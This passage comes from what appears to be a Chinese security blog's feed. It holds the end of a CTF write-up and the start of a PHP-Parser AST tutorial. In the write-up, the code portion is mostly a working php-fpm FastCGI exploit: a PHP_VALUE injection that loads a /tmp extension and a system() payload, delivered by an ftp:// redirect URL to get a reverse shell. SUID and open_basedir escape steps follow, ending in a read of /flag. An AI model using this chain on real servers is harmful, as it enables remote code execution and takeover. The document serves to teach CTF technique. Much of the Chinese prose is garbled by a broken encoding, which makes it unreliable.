class="variable">$vlen</span>);</span><br><span class="line">            <span class="variable">$p</span> += (<span class="variable">$nlen</span> + <span class="variable">$vlen</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Decode a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data String containing all the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">decodePacketHeader</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;version&#x27;</span>]       = ord(<span class="variable">$data</span>&#123;<span class="number">0</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;type&#x27;</span>]          = ord(<span class="variable">$data</span>&#123;<span class="number">1</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;requestId&#x27;</span>]     = (ord(<span class="variable">$data</span>&#123;<span class="number">2</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$data</span>&#123;<span class="number">3</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;contentLength&#x27;</span>] = (ord(<span class="variable">$data</span>&#123;<span class="number">4</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$data</span>&#123;<span class="number">5</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;paddingLength&#x27;</span>] = ord(<span class="variable">$data</span>&#123;<span class="number">6</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;reserved&#x27;</span>]      = ord(<span class="variable">$data</span>&#123;<span class="number">7</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readPacket</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$packet</span> = fread(<span class="keyword">$this</span>-&gt;_sock, <span class="built_in">self</span>::HEADER_LEN)) &#123;</span><br><span class="line">            <span class="variable">$resp</span> = <span class="keyword">$this</span>-&gt;decodePacketHeader(<span class="variable">$packet</span>);</span><br><span class="line">            <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$len</span>  = <span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>];</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$len</span> &amp;&amp; <span class="variable">$buf</span>=fread(<span class="keyword">$this</span>-&gt;_sock, <span class="variable">$len</span>)) &#123;</span><br><span class="line">                    <span class="variable">$len</span> -= strlen(<span class="variable">$buf</span>);</span><br><span class="line">                    <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] .= <span class="variable">$buf</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$buf</span>=fread(<span class="keyword">$this</span>-&gt;_sock, <span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$resp</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get Informations on the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $requestedInfo information to retrieve</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValues</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$requestedInfo</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connect();</span><br><span class="line">        <span class="variable">$request</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$requestedInfo</span> <span class="keyword">as</span> <span class="variable">$info</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildNvpair(<span class="variable">$info</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;_sock, <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::GET_VALUES, <span class="variable">$request</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="variable">$resp</span> = <span class="keyword">$this</span>-&gt;readPacket();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;type&#x27;</span>] == <span class="built_in">self</span>::GET_VALUES_RESULT) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;readNvpair(<span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>], <span class="variable">$resp</span>[<span class="string">&#x27;length&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute a request to the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $params Array of parameters</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $stdin Content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$params</span>, <span class="variable">$stdin</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$response</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//        $this-&gt;connect();</span></span><br><span class="line">        <span class="variable">$request</span> = <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::BEGIN_REQUEST, chr(<span class="number">0</span>) . chr(<span class="built_in">self</span>::RESPONDER) . chr((<span class="keyword">int</span>) <span class="keyword">$this</span>-&gt;_keepAlive) . str_repeat(chr(<span class="number">0</span>), <span class="number">5</span>));</span><br><span class="line">        <span class="variable">$paramsRequest</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$paramsRequest</span> .= <span class="keyword">$this</span>-&gt;buildNvpair(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$paramsRequest</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="variable">$paramsRequest</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$stdin</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="variable">$stdin</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;data=&#x27;</span>.urlencode(<span class="variable">$request</span>));</span><br><span class="line"><span class="comment">//        fwrite($this-&gt;_sock, $request);</span></span><br><span class="line"><span class="comment">//        do &#123;</span></span><br><span class="line"><span class="comment">//            $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="comment">//            if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;</span></span><br><span class="line"><span class="comment">//                $response .= $resp[&#x27;content&#x27;];</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);</span></span><br><span class="line"><span class="comment">//        var_dump($resp);</span></span><br><span class="line"><span class="comment">//        if (!is_array($resp)) &#123;</span></span><br><span class="line"><span class="comment">//            throw new Exception(&#x27;Bad request&#x27;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;</span></span><br><span class="line"><span class="comment">//            case self::CANT_MPX_CONN:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;This app can\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::OVERLOADED:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::UNKNOWN_ROLE:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::REQUEST_COMPLETE:</span></span><br><span class="line"><span class="comment">//                return $response;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// real exploit start here</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    die(&quot;Check your input\n&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    $filepath = __FILE__;</span></span><br><span class="line"><span class="comment">//&#125;else&#123;</span></span><br><span class="line"><span class="comment">//    $filepath = $_REQUEST[&#x27;filepath&#x27;];</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filepath</span> = <span class="string">&quot;/var/www/html/add_api.php&quot;</span>;</span><br><span class="line"><span class="variable">$req</span> = <span class="string">&#x27;/&#x27;</span>.basename(<span class="variable">$filepath</span>);</span><br><span class="line"><span class="variable">$uri</span> = <span class="variable">$req</span> .<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;command=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> FCGIClient(<span class="string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>; <span class="comment">// php payload -- Doesnt do anything</span></span><br><span class="line"><span class="variable">$php_value</span> = <span class="string">&quot;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;</span>;</span><br><span class="line"><span class="variable">$params</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; <span class="variable">$filepath</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; <span class="variable">$req</span>,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>      =&gt; <span class="string">&#x27;command=whoami&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>       =&gt; <span class="variable">$uri</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; <span class="variable">$req</span>,</span><br><span class="line"><span class="comment">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span>         =&gt; <span class="variable">$php_value</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="string">&#x27;80sec/wofeiwo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="string">&#x27;9001&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>    =&gt; strlen(<span class="variable">$code</span>)</span><br><span class="line">);</span><br><span class="line"><span class="comment">// print_r($_REQUEST);</span></span><br><span class="line"><span class="comment">// print_r($params);</span></span><br><span class="line"><span class="comment">//echo &quot;Call: $uri\n\n&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$client</span>-&gt;request(<span class="variable">$params</span>, <span class="variable">$code</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€åæ„é€ æ¶æ„ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;add_api.php?backdoor&#x3D;$file &#x3D; $_GET[&#39;file&#39;];$data &#x3D; $_GET[&#39;data&#39;];file_put_contents($file,$data);&amp;file&#x3D;ftp:&#x2F;&#x2F;aaa@xxx.xx.xx.xxx:23&#x2F;123&amp;data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00</span><br></pre></td></tr></table></figure><p>å½“ ftp å»ºç«‹è¿æ¥åï¼Œä¼šé€šè¿‡ ftp passive mode æ¨¡å¼å°† payload é‡å®šå‘åˆ°ç›®æ ‡ä¸»æœºæœ¬åœ° 9001 ç«¯å£çš„ php-fpm ä¸Šï¼Œå¹¶æˆåŠŸåå¼¹shellï¼š</p><p><img src="https://i.loli.net/2021/05/03/BWi8gjseEa93w6S.png"></p><p>ä½†æ˜¯ğŸ‘´å¹¶æ²¡æœ‰è¯»å– flag çš„æƒé™ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦ææƒï¼Œæœ€å¸¸è§çš„ä¾¿æ˜¯ä½¿ç”¨ suid ææƒï¼š</p><p>æŸ¥çœ‹å…·æœ‰ suid çš„å‘½ä»¤ï¼š<code>find / -perm -u=s -type f 2&gt;/dev/null</code></p><p>åœ¨ğŸ‘´å¤ç°çš„æ—¶å€™æ­»æ´»æ²¡æœ‰æŸ¥å‡º  /usr/local/bin/php ï¼Œæ‰€ä»¥å€Ÿç”¨äº†åˆ«çš„å¸ˆå‚…çš„å›¾ï¼š</p><p><img src="https://i.loli.net/2021/05/03/1Eez7giZrwmFf2u.png"></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è¿›å…¥äº¤äº’æ¨¡å¼æ‰§è¡Œä»£ç ï¼Œå¾—åˆ° flagï¼š</p><p><code>chdir(&#39;Du1&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo file_get_contents(&#39;/flag&#39;);</code></p><p><img src="https://i.loli.net/2021/05/03/VD4goPYEXUA9Gmb.png"></p><p>å®Œäº‹</p>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºPHP-ASTè¿™ä»¶äº‹</title>
      <link href="2021/04/27/%E5%85%B3%E4%BA%8EPHP-AST%E8%BF%99%E4%BB%B6%E4%BA%8B/"/>
      <url>2021/04/27/%E5%85%B3%E4%BA%8EPHP-AST%E8%BF%99%E4%BB%B6%E4%BA%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP-Parser"><a href="#PHP-Parser" class="headerlink" title="PHP-Parser"></a>PHP-Parser</h2><p>ğŸ‘´æƒ³å†™ä¸€ä¸ªè‡ªåŠ¨åŒ–å¯»æ‰¾ php ååºåˆ—åŒ–é“¾çš„å°ç©æ„ã€‚</p><p>æœ€å¼€å§‹å†™é¡¹ç›®çš„é©±åŠ¨æ˜¯é»„æ€»è¯´è¦å‡†å¤‡å›½èµ›çš„é¡¹ç›®èµ›ï¼Œç„¶åè¡¨ç¤ºâ€œä»Šå¹´ä¸èƒ½åƒå»å¹´ä¸€æ ·é¸½æ‰äº†â€ï¼Œå†ç„¶ååœ¨ä¸€æ¬¡å¼€ä¼šä¸Šï¼ŒåŒæ–¹ä¹Ÿæ˜¯ç›¸è§†ä¸€ç¬‘ï¼šâ€œå˜¿å˜¿ï¼Œå˜¿å˜¿â€ï¼Œä¹Ÿå°±è¿™ä¹ˆæç½®ä¸‹æ¥äº†ã€‚ç„¶åè¯´è¦æˆ‘ä»¬å‡†å¤‡å¥½å¸¦å¥½ä¸‹ä¸€å±Šï¼Œè®©ä»–ä»¬æï¼Œç„¶åçœ‹äº†çœ‹è¿™ç¾¤å…”å´½å­ï¼Œå½³äºâ€¦â€¦è¿˜è¿œç€ã€‚ç„¶åç°åœ¨æ˜¯ç¡®å®è‡ªå·±æœ‰äº†æƒ³æçš„åŠ¨åŠ›ï¼ˆåŸå› ä¸æ˜ï¼‰ï¼Œçªç„¶ï¼Œæ¬¸å°±å¾ˆæƒ³æäº†ï¼Œæ‰€ä»¥å°±å†æ¡èµ·æ¥ã€‚</p><p>ä½†æ˜¯å¯¹äºå¤§æ¦‚çš„é¡¹ç›®æµç¨‹è¿˜æ˜¯è›®ä¸ç†è§£ï¼Œåˆæ˜¯è‡ªå·±ä¸€ä¸ªäººæï¼Œå°±å…ˆæ‘¸ç´¢ç ”ç©¶ä¸€ä¸‹ã€‚åœ¨ç½‘ä¸Šæ‰¾äº†å¾ˆä¹…æ‰¾åˆ°äº† <code>PHP-Parser</code> è¿™ä¸ªå·¥å…·ï¼Œæ˜¯ä¸“é—¨åš PHP AST çš„ï¼Œç®€å•ä»‹ç»ä¸€ä¸‹å§</p><hr><p>PHP-Parser çš„é¡¹ç›®ä¸»é¡µæ˜¯ <a href="https://github.com/nikic/PHP-Parser%E3%80%82%E5%8F%AF%E4%BB%A5%E5%AF%B9%E5%A4%9A%E7%89%88%E6%9C%AC%E7%9A%84">https://github.com/nikic/PHP-Parserã€‚å¯ä»¥å¯¹å¤šç‰ˆæœ¬çš„</a> PHP è¿›è¡Œå®Œç¾è§£æï¼Œç”Ÿæˆä¸€ä¸ªæŠ½è±¡è¯­æ³•æ ‘</p><p>å¯¹äºè¯æ³•åˆ†æï¼ŒPHP æœ‰ä¸ªå†…ç½®å‡½æ•° <code>token_get_all()</code> å¯ä»¥ç”¨æ¥è·å– TOKENSï¼Œä½œä¸ºè¯­æ³•åˆ†æçš„è¾“å…¥ï¼Œè¿™ä¸ªå¼€æºé¡¹ç›®ä¹Ÿæ˜¯ç”¨çš„ <code>token_get_all()</code> ç”Ÿæˆçš„ token æµ</p><blockquote><p>ä¸è¿‡è¯è¯´å›æ¥ï¼ŒASTï¼Œå³ Abstract Syntax Treeï¼Œä¹Ÿå°±æ˜¯æŠ½è±¡è¯­æ³•æ ‘ï¼Œå®ƒæ˜¯æºä»£ç è¯­æ³•ç»“æ„çš„ä¸€ç§æŠ½è±¡è¡¨ç¤ºï¼Œå¯ä»¥å°†ä½ æ‰€å†™çš„çš„ä»£ç ç”¨æ ‘çŠ¶ç»“æ„åŒ–è¡¨ç°å‡ºæ¥</p></blockquote><hr><p>é‚£ä¹ˆè¯ä¸å¤šè¯´ï¼Œç›´æ¥å¼€æ•´å§</p><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>å¯ä»¥ä½¿ç”¨ PHP çš„åŒ…ç®¡ç†å·¥å…· composer æ·»åŠ ï¼Œåœ¨é¡¹ç›®ç›®å½•æ‰§è¡Œå‘½ä»¤ <code>php composer.phar require nikic/php-parser</code> å³å¯ï¼Œå¦‚æœæ²¡æœ‰ä¸‹è½½ composerï¼Œå°±å…ˆæ‰§è¡Œ <code>curl -s http://getcomposer.org/installer | php</code> æ¥å®‰è£…ã€‚</p><h3 id="å¼€æ"><a href="#å¼€æ" class="headerlink" title="å¼€æ"></a>å¼€æ</h3><p>è·Ÿç€<a href="https://github.com/nikic/PHP-Parser/tree/master/doc">å®˜æ–¹æ–‡æ¡£</a> å­¦äº†ã€‚</p><h4 id="åŸºæœ¬ç»„æˆè¯­æ³•"><a href="#åŸºæœ¬ç»„æˆè¯­æ³•" class="headerlink" title="åŸºæœ¬ç»„æˆè¯­æ³•"></a>åŸºæœ¬ç»„æˆè¯­æ³•</h4><h5 id="å¼•å…¥"><a href="#å¼•å…¥" class="headerlink" title="å¼•å…¥"></a>å¼•å…¥</h5><p>å¦‚æœè¦ä½¿ç”¨è¿™ä¸ªåº“çš„è¯ï¼Œé¦–å…ˆè¦å°† composer ç”Ÿæˆçš„è‡ªåŠ¨è£…å¸¦å™¨ç»™åŒ…å«è¿›æ¥ï¼Œå¯ä»¥ä½¿ç”¨ <code>require &#39;path/to/vendor/autoload.php&#39;;</code>ã€‚</p><p>å¦å¤–ï¼Œä½ å¯ä»¥æŠŠ <code>xdebug.max_nesting_level</code> è®¾ç½®ä¸ºæ›´é«˜çš„å€¼ï¼š<code>ini_set(&#39;xdebug.max_nesting_level&#39;, 3000);</code>ã€‚</p><p>è¿™æ ·å¯ä»¥ç¡®ä¿éå†é«˜åº¦åµŒå¥—çš„èŠ‚ç‚¹æ ‘æ—¶ä¸ä¼šå‡ºç°é”™è¯¯ï¼Œä½†æ˜¯æœ€å¥½å®Œå…¨ç¦ç”¨ Xdebugï¼Œå› ä¸ºå®ƒå¾ˆå®¹æ˜“ä½¿è¯¥åº“çš„è¿è¡Œé€Ÿåº¦æ…¢äº”å€ä»¥ä¸Šã€‚</p><h5 id="è§£æ"><a href="#è§£æ" class="headerlink" title="è§£æ"></a>è§£æ</h5><p>æˆ‘ä»¬å¯ä»¥åˆ›é€ ä¸€ä¸ª parserï¼ˆè§£æå™¨ï¼‰å®ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"><span class="variable">$parser</span> = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå·¥å‚ç±»æ¥å—ä¸€ä¸ªå‚æ•°ä»¥åŒºåˆ«å¯¹å¾…ä¸åŒç‰ˆæœ¬çš„ PHPï¼š</p><table><thead><tr><th>Kind</th><th>Behavior</th></tr></thead><tbody><tr><td>ParserFactory::PREFER_PHP7</td><td>å°è¯•å°†ä»£ç è§£æä¸ºPHP7ã€‚å¦‚æœå¤±è´¥ï¼Œè¯·å°è¯•å°†å…¶è§£æä¸ºPHP 5</td></tr><tr><td>ParserFactory::PREFER_PHP5</td><td>å°è¯•å°†ä»£ç è§£æä¸ºPHP5ã€‚å¦‚æœå¤±è´¥ï¼Œè¯·å°è¯•å°†å…¶è§£æä¸ºPHP 7</td></tr><tr><td>ParserFactory::ONLY_PHP7</td><td>å°†ä»£ç è§£æä¸ºPHP7</td></tr><tr><td>ParserFactory::ONLY_PHP5</td><td>å°†ä»£ç è§£æä¸ºPHP5</td></tr></tbody></table><p>é™¤éæœ‰æ›´å¥½çš„é€‰æ‹©ï¼Œä¸€èˆ¬é»˜è®¤ç”¨ <code>PREFER_PHP7</code>ï¼Œ<code>create()</code> æ–¹æ³•å¯ä»¥é€‰æ‹©æ€§åœ°æ¥å— <code>Lexer</code> ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ï¼Œè¿™ä¸ªæˆ‘ä»¬å§‘ä¸”ä¸åšç ”ç©¶ã€‚</p><p>ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæˆ‘ä»¬éœ€è¦ AST åŒ–çš„ PHP ä»£ç ä¼ é€’ç»™ parse æ–¹æ³•ï¼Œå¦‚æœé‡åˆ°äº†è¯­æ³•é”™è¯¯ï¼Œå°†ä¼šæŠ›å‡º <code>PhpParser\Error</code> å¼‚å¸¸ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">Error</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = &lt;&lt;&lt;<span class="string">&#x27;CODE&#x27;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printLine</span>(<span class="params"><span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$msg</span>, <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">printLine(<span class="string">&#x27;Hello World!!!&#x27;</span>);</span><br><span 